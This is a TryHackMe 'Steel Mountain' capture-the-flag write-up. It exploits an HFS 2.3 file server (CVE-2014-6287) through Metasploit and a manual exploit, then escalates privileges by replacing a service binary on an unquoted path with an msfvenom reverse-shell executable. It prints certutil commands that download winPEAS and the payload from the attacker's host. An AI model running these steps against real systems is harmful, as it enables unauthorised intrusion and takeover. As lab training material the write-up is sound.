---
title: "TryHackMe - Steel Mountain"
date: 2025-04-27 12:00:00 +0000
categories: ["CTF", "TryHackMe"]
tags: ["windows", "metasploit", "powershell", "privesc"]
image:
  path: /assets/images/steel-mountain/banner.png
---

# Steel Mountain
![](/assets/images/steel-mountain/banner.png)

- running a scan to know what is going on on our targets network
  
## Scan results

```bash
~$ >> nmap -A 10.10.70.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-30 02:09 EST
Nmap scan report for 10.10.70.217
Host is up (0.32s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-01-30T07:13:28+00:00; +1m50s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-01-29T06:47:42
|_Not valid after:  2024-07-30T06:47:42
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-01-30T07:13:21+00:00
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:4c:5d:c0:bf:49 (unknown)
| smb2-time: 
|   date: 2024-01-30T07:13:22
|_  start_date: 2024-01-30T06:47:34
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1m49s, deviation: 0s, median: 1m49s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 150.59 seconds
```
- From the above result i see that is is a windows OS.
- it has a web-server running on both port `80` an `8080` 

navigating to the web-server on port `80` i found a picture of the employee of the month and nothing else
![](/assets/images/steel-mountain/01_employee_of_the_month.png)
But when i view the page source i see where the web-server is serving that image from there backend server and the image is saved with a human name so it has to be `employee of the month` 
![](/assets/images/steel-mountain/02_bill_harper_source.png)
- Nothing else to see from here so i navigate to the second web-server `8080`
  
## Initial access

![](/assets/images/steel-mountain/03_hfs_web_server.png)
- i was able to see the service version of the web-server from the bottom of the web-page
i then search for the version of the sever and i found the full name of the file server running and a possible exploit
![](/assets/images/steel-mountain/04_google_hfs_search.png)
clicking on the first link i was able to understand what i can use to get access 
![](/assets/images/steel-mountain/05_exploitdb_cve_2014_6287.png)
From some of the other search results i noticed some website said there is an exploit for this vulnerability on metasploit, so i start up metasploit and search using the `CVE` 
![](/assets/images/steel-mountain/06_msf_search_options.png)
Then i set the needed options and run the module to get a Meterpreter shell
![](/assets/images/steel-mountain/07_msf_exploit_run.png)

checking information about the target system i have :

![](/assets/images/steel-mountain/08_sysinfo_getuid.png)
![](/assets/images/steel-mountain/09_user_flag.png)
```bash
C:\Users\bill\Desktop
```

## Privilege Escalation

To enumerate this machine, i will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities
- "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations._"

You can download the script [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1).  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the **upload** command in Metasploit to upload the script.

![](/assets/images/steel-mountain/10_upload_powerup.png)

```
To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell
```
![](/assets/images/steel-mountain/11_meterpreter_powershell.png)

![](/assets/images/steel-mountain/12_powerup_unquoted_service.png)

>[!note] 
>The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Using  msfvenom to generate a reverse shell as an Windows executable and naming it the exact name of the `AdvancedSystemCareService9` executable file: `Advanced.exe` and using the encoder `x86/shikata_ga_nai` 
![](/assets/images/steel-mountain/13_msfvenom_payload.png)
Then i uploaded the executable file into the `Iobit` Directory on `Bill's` machine
![](/assets/images/steel-mountain/14_upload_advanced_exe.png)
i type `shell` in the meterpreter prompt to get a windows shell and copy the `Advanced.exe` file into the `Advanced SystemCare` directory
![](/assets/images/steel-mountain/15_copy_advanced_exe.png)
in a new terminal i started a netcat listener on the port specified in the msfvenom payload i created earlier.
![](/assets/images/steel-mountain/16_netcat_listener.png)

Then i stop and restart the `AdvancedSystemCareService9` service and i got an `NTauthority\system` reverse shell to the listener
![](/assets/images/steel-mountain/17_service_restart_reverse_shell.png)

![](/assets/images/steel-mountain/18_whoami_system.png)

![](/assets/images/steel-mountain/19_root_flag.png)

# Manual Foothold and exploitation

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to.

To begin we shall be using the same CVE `the exploit code from exploitdb` [here](https://www.exploit-db.com/download/39161)

To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from [GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!.

- before i begin i restart the machine so all changes will reset back to default
after downloading the exploit i used nano to change some needed settings
![](/assets/images/steel-mountain/20_nano_exploit_py.png)
then i change the name of the Netcat binary i downloaded from `ncat.exe` to `nc.exe` because from the exploit code i see that it is calling `nc.exe` not `ncat.exe`
```bash
~$ >> mv ncat.exe nc.exe
```
1. i started a python server in the directory i have the `nc.exe` binary and also start a listener withe the port specified in the exploit the i run the exploit
![](/assets/images/steel-mountain/21_manual_exploit_run1.png)
2. i run the exploit again and this time i get a reverse shell connection
![](/assets/images/steel-mountain/22_manual_exploit_run2.png)

![](/assets/images/steel-mountain/23_manual_shell_bill.png)
### Privilege Escalation
I downloaded the WinpeasX64exe file from there official [Github](https://github.com/carlospolop/PEASS-ng/releases/download/20240128-3084e4e1/winPEASx64.exe)

I started another python web server in the directory i downnloaded it too and i created a directory on the target machine then use `certutil` to transfer the winPEAS binary to the target machine
![](/assets/images/steel-mountain/24_transfer_winpeas.png)

```powershell
certutil -urlcache -f http://10.6.92.85:80/winPEASx64.exe winPEASx64.exe
```
then i run the the winPEAS script:
![](/assets/images/steel-mountain/25_run_winpeas.png)
scrolling through the output i see this section about the unquoted path we used earlier
![](/assets/images/steel-mountain/26_winpeas_unquoted_path.png)
running `powershell -c get-service` , i can see that the service is running `sc stop AdvancedSystemCareService9` :
![](/assets/images/steel-mountain/27_powershell_get_service.png)

Then i moved into the Iobit directory and use `certutil` to download the advance.exe file i created earlier with msfvenom to the target machine (my python server is still running)

```powershell
certutil -urlcache -f http://10.6.92.85:80/Advanced.exe Advanced.exe
```

i copied the advanced.exe file to the `Advanced SystemCare` directory then i stop and restart the service `sc stop AdvancedSystemCareService9`then `sc start AdvancedSystemCareService9` 

- lastly i use netcat to listen on the port that is specified in my msfvenom payload and i got a higher privilege shell
![](/assets/images/steel-mountain/28_final_system_shell.png)
